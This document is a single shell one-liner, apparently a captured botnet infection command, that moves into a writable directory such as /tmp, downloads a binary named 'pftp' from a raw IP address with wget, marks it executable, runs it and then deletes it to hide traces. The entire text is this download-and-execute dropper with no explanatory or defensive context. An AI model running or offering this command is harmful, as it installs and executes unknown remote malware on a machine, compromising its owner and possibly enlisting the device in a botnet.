cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.23.6.179/pftp; chmod +x pftp; ./pftp; rm -rf pftp
